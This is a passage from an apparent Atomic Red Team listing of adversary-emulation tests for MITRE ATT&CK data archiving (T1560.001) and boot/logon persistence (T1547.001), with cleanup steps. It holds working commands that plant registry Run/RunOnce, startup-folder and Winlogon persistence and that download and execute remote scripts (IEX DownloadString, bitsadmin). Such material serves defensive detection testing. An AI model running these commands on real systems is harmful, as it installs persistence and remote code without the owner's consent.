ROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}
Command (with inputs):
"%programfiles%/WinRAR/Rar.exe" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt

Cleanup Commands:
Command:
del /f /q /s #{output_file} >nul 2>&1
Command (with inputs):
del /f /q /s %USERPROFILE%\T1560.001-data.rar >nul 2>&1

Dependencies:
Description: Rar tool must be installed at specified location (%programfiles%/WinRAR/Rar.exe)
Check Prereq Command:
if not exist "#{rar_exe}" (exit /b 1)
Check Prereq Command (with inputs):
if not exist "%programfiles%/WinRAR/Rar.exe" (exit /b 1)
Get Prereq Command:
echo Downloading Winrar installer
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
#{rar_installer} /S
Get Prereq Command (with inputs):
echo Downloading Winrar installer
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" %TEMP%\winrar.exe
%TEMP%\winrar.exe /S
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Archive Collected Data: Archive via Utility T1560.001
Atomic Test Name: Compress Data and lock with password for Exfiltration with winrar
Atomic Test Number: 2
Atomic Test GUID: 8dd61a55-44c6-43cc-af0c-8bdda276860c
Description: Note: Requires winrar installation rar a -p"blue" hello.rar (VARIANT)

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
"#{rar_exe}" a -hp"blue" hello.rar
dir
Command (with inputs):
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
"%programfiles%/WinRAR/Rar.exe" a -hp"blue" hello.rar
dir

Dependencies:
Description: Rar tool must be installed at specified location (%programfiles%/WinRAR/Rar.exe)
Check Prereq Command:
if not exist "#{rar_exe}" (exit /b 1)
Check Prereq Command (with inputs):
if not exist "%programfiles%/WinRAR/Rar.exe" (exit /b 1)
Get Prereq Command:
echo Downloading Winrar installer
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
#{rar_installer} /S
Get Prereq Command (with inputs):
echo Downloading Winrar installer
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" %TEMP%\winrar.exe
%TEMP%\winrar.exe /S
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Archive Collected Data: Archive via Utility T1560.001
Atomic Test Name: Compress Data and lock with password for Exfiltration with winzip
Atomic Test Number: 3
Atomic Test GUID: 01df0353-d531-408d-a0c5-3161bf822134
Description: Note: Requires winzip installation wzzip sample.zip -s"blueblue" *.txt (VARIANT)

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
path=%path%;"C:\Program Files (x86)\winzip"
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
"#{winzip_exe}" -min -a -s"hello" archive.zip *
dir
Command (with inputs):
path=%path%;"C:\Program Files (x86)\winzip"
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
"%ProgramFiles%\WinZip\winzip64.exe" -min -a -s"hello" archive.zip *
dir

Dependencies:
Description: Winzip must be installed
Check Prereq Command:
cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)'
Check Prereq Command (with inputs):
cmd /c 'if not exist "%ProgramFiles%\WinZip\winzip64.exe" (echo 1) else (echo 0)'
Get Prereq Command:
IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
if(Invoke-WebRequestVerifyHash "#{winzip_url}" "PathToAtomicsFolder\..\ExternalPayloads\winzip.exe" #{winzip_hash}){
  Write-Host Follow the installation prompts to continue
  cmd /c "PathToAtomicsFolder\..\ExternalPayloads\winzip.exe"
}
Get Prereq Command (with inputs):
IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
if(Invoke-WebRequestVerifyHash "https://download.winzip.com/gl/nkln/winzip24-home.exe" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\winzip.exe" B59DB592B924E963C21DA8709417AC0504F61
58CFCB12FE5536F4A0E0D57D7FB){
  Write-Host Follow the installation prompts to continue
  cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\winzip.exe"
}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Archive Collected Data: Archive via Utility T1560.001
Atomic Test Name: Compress Data and lock with password for Exfiltration with 7zip
Atomic Test Number: 4
Atomic Test GUID: d1334303-59cb-4a03-8313-b3e24d02c198
Description: Note: This test requires 7zip installation

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
mkdir $PathToAtomicsFolder\T1560.001\victim-files
cd $PathToAtomicsFolder\T1560.001\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
"#{7zip_exe}" u archive.7z *txt -pblue
dir
Command (with inputs):
mkdir C:\AtomicRedTeam\atomics\T1560.001\victim-files
cd C:\AtomicRedTeam\atomics\T1560.001\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
"%ProgramFiles%\7-zip\7z.exe" u archive.7z *txt -pblue
dir

Cleanup Commands:
Command:
rmdir /s /Q $PathToAtomicsFolder\T1560.001\victim-files >nul 2>&1
Command (with inputs):
rmdir /s /Q C:\AtomicRedTeam\atomics\T1560.001\victim-files >nul 2>&1

Dependencies:
Description: 7zip tool must be installed at specified location (%ProgramFiles%\7-zip\7z.exe)
Check Prereq Command:
if not exist "#{7zip_exe}" (exit /b 1)
Check Prereq Command (with inputs):
if not exist "%ProgramFiles%\7-zip\7z.exe" (exit /b 1)
Get Prereq Command:
echo Downloading 7-zip installer
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2301-x64.exe" #{7zip_installer}
#{7zip_installer} /S
Get Prereq Command (with inputs):
echo Downloading 7-zip installer
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2301-x64.exe" %TEMP%\7zip.exe
%TEMP%\7zip.exe /S
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution T1547
Atomic Test Name: Add a driver
Atomic Test Number: 1
Atomic Test GUID: cb01b3da-b0e7-4e24-bf6d-de5223526785
Description: Install a driver via pnputil.exe lolbin

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
pnputil.exe /add-driver "#{driver_inf}"
Command (with inputs):
pnputil.exe /add-driver "C:\Windows\INF\usbstor.inf"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Reg Key Run
Atomic Test Number: 1
Atomic Test GUID: e55be3fd-3521-4610-9d1a-e210e42dcf05
Description: Run Key Persistence
Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
Command (with inputs):
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"

Cleanup Commands:
Command:
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Reg Key RunOnce
Atomic Test Number: 2
Atomic Test GUID: 554cbd88-cde1-4b56-8168-0be552eed9eb
Description: RunOnce Key Persistence.
Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
Command (with inputs):
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"

Cleanup Commands:
Command:
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: PowerShell Registry RunOnce
Atomic Test Number: 3
Atomic Test GUID: eb44f842-0457-4ddc-9b92-c4caa144ac42
Description: RunOnce Key Persistence via PowerShell Upon successful execution, a new entry will be added to the runonce item in the registry.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
Command (with inputs):
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/sr
c/Discovery.bat`")"'

Cleanup Commands:
Command:
Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
Command (with inputs):
Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Suspicious vbs file run from startup Folder
Atomic Test Number: 4
Atomic Test GUID: 2cb98256-625e-4da9-9d44-f2e5f90b8bd5
Description: vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, "T1547.001 Hello, World VBS!" will be displayed twice.  Additionally,
 the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" folder and will also run when the computer is restarted and the user logs in.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
Command (with inputs):
Copy-Item "C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
Copy-Item "C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"

Cleanup Commands:
Command:
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Suspicious jse file run from startup Folder
Atomic Test Number: 5
Atomic Test GUID: dade9447-791e-4c8f-b04b-3a35855dfa06
Description: jse files can be placed in and ran from the startup folder to maintain persistance. Upon execution, "T1547.001 Hello, World JSE!" will be displayed twice.  Additionally,
 the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" folder and will also run when the computer is restarted and the user logs in.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
Command (with inputs):
Copy-Item "C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
Copy-Item "C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"

Cleanup Commands:
Command:
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Suspicious bat file run from startup Folder
Atomic Test Number: 6
Atomic Test GUID: 5b6768e4-44d2-44f0-89da-a01d1430fd5e
Description: bat files can be placed in and executed from the startup folder to maintain persistance
Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" folder and will 
also run when the computer is restarted and the user logs in.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Command (with inputs):
Copy-Item "C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Copy-Item "C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"

Cleanup Commands:
Command:
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Add Executable Shortcut Link to User Startup Folder
Atomic Test Number: 7
Atomic Test GUID: 24e55612-85f6-4bd6-ae74-a73d02e3441d
Description: Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the sh
ortcut link exists.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$Target = "C:\Windows\System32\calc.exe"
$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()

Cleanup Commands:
Command:
Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Add persistance via Recycle bin
Atomic Test Number: 8
Atomic Test GUID: bda6a3d6-7aa7-4e89-908b-306772e9662f
Description: Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Per
sistence_via_Recycle_Bin.pdf) User have to clic on the recycle bin to lauch the payload (here calc)

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f

Cleanup Commands:
Command:
reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: SystemBC Malware-as-a-Service Registry
Atomic Test Number: 9
Atomic Test GUID: 9dc7767b-30c1-4cc4-b999-50cab5e27891
Description: This Atomic will create a registry key called socks5_powershell for persistance access https://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$RunKey = "#{reg_key_path}"
Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"
Command (with inputs):
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"

Cleanup Commands:
Command:
Remove-ItemProperty -Path #{reg_key_path} -Name "socks5_powershell" -Force -ErrorAction Ignore
Command (with inputs):
Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "socks5_powershell" -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
Atomic Test Number: 10
Atomic Test GUID: acfef903-7662-447e-a391-9c91c2f00f7b
Description: This test will modify the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders -V "Common Startup"  value to point to a new startup f
older where a payload could be stored to launch at boot.  *successful execution requires system restart

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
New-Item -ItemType Directory -path "#{new_startup_folder}"
Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "#{new_startup_folder}"
Command (with inputs):
New-Item -ItemType Directory -path "$env:TMP\atomictest\"
Copy-Item -path "C:\Windows\System32\calc.exe" -destination "$env:TMP\atomictest\"
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "$env:TMP\atomictest\"

Cleanup Commands:
Command:
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Progra
ms\Startup"
Remove-Item "#{new_startup_folder}" -Recurse -Force
Command (with inputs):
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Progra
ms\Startup"
Remove-Item "$env:TMP\atomictest\" -Recurse -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
Atomic Test Number: 11
Atomic Test GUID: 8834b65a-f808-4ece-ad7e-2acdf647aafa
Description: This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value  to point to a new startup folder w
here a payload could be stored to launch at boot.  *successful execution requires system restart

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
New-Item -ItemType Directory -path "#{new_startup_folder}"
Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
Command (with inputs):
New-Item -ItemType Directory -path "$env:TMP\atomictest\"
Copy-Item -path "C:\Windows\System32\calc.exe" -destination "$env:TMP\atomictest\"
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:TMP\atomictest\"

Cleanup Commands:
Command:
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Start
up"
Remove-Item "#{new_startup_folder}" -Recurse -Force
Command (with inputs):
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Start
up"
Remove-Item "$env:TMP\atomictest\" -Recurse -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: HKCU - Policy Settings Explorer Run Key
Atomic Test Number: 12
Atomic Test GUID: a70faea1-e206-4f6f-8d9a-67379be8f6f1
Description: This test will create a new value under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run to launch calc.exe on boot.  *Requires reboot

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
  New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
}
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
Command (with inputs):
if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
  New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
}
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest" -Value "C:\Windows\System32\calc.exe"

Cleanup Commands:
Command:
Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}"
Command (with inputs):
Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: HKLM - Policy Settings Explorer Run Key
Atomic Test Number: 13
Atomic Test GUID: b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f
Description: This test will create a HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run key value to launch calc.exe on boot.  *Requires reboot

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
  New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
}
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
Command (with inputs):
if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
  New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
}
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest" -Value "C:\Windows\System32\calc.exe"

Cleanup Commands:
Command:
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}"
Command (with inputs):
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: HKLM - Append Command to Winlogon Userinit KEY Value
Atomic Test Number: 14
Atomic Test GUID: f7fab6cc-8ece-4ca7-a0f1-30a22fccd374
Description: This test will append a command to the  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit value to launch calc.exe on boot. * Requires re
boot

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
$newvalue = $oldvalue + " #{payload}";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
Command (with inputs):
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
$newvalue = $oldvalue + " C:\Windows\System32\calc.exe";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"

Cleanup Commands:
Command:
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup');
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: HKLM - Modify default System Shell - Winlogon Shell KEY Value 
Atomic Test Number: 15
Atomic Test GUID: 1d958c61-09c6-4d9e-b26b-4130314e520e
Description: This test change the default value of HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell from "explorer.exe" to the full path of "C:\Windows\
explorer.exe"  to log a change to the key's default value without breaking boot sequence.  An atacker will alternatively replace this with a custom shell.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";
$newvalue = $oldvalue + ", #{payload}";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"
Command (with inputs):
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";
